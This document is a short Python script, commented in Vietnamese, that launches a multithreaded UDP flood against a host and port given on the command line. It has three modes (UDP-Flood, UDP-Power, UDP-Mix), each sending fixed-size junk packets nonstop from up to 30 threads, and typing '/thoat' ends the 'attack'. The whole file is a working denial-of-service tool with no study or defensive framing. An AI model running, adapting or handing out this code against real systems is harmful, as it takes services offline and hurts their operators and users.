import sys
import socket
import threading

host = str(sys.argv[1])
port = int(sys.argv[2])
method = str(sys.argv[3])

running = True  # Biến cờ để dừng các luồng khi cần

packet_data_1 = b"\x99" * 375
packet_data_2 = b"\x99" * 750

def send_packet(data):
    global running
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((host, port))
        while running:
            s.send(data)
    except:
        pass
    finally:
        s.close()

def user_input_monitor():
    global running
    while True:
        cmd = input()
        if cmd.strip().lower() == "/thoat":
            print("Đã nhận lệnh /thoat. Dừng tấn công...")
            running = False
            break

def attack_HQ():
    threads = []

    if method == "UDP-Flood":
        for _ in range(30):
            t = threading.Thread(target=send_packet, args=(packet_data_1,))
            t.start()
            threads.append(t)

    elif method == "UDP-Power":
        for _ in range(30):
            t = threading.Thread(target=send_packet, args=(packet_data_2,))
            t.start()
            threads.append(t)

    elif method == "UDP-Mix":
        for _ in range(15):
            t1 = threading.Thread(target=send_packet, args=(packet_data_1,))
            t2 = threading.Thread(target=send_packet, args=(packet_data_2,))
            t1.start()
            t2.start()
            threads.extend([t1, t2])

    # Bắt đầu luồng chờ lệnh "/thoat"
    threading.Thread(target=user_input_monitor, daemon=True).start()

    # Chờ các luồng chính kết thúc
    for t in threads:
        t.join()

attack_HQ()
